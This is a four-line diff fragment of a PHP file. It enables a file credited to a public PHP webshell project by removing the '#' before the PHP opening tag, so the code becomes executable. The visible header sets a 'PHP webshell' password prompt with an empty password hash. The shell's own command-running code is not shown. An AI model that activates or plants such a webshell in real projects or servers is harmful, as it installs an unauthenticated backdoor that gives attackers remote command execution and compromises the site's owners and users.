@@ -1,4 +1,4 @@
-#<?php
+<?php
 /* From: https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php */
 $passprompt = "PHP webshell: ";
 $passhash = "";
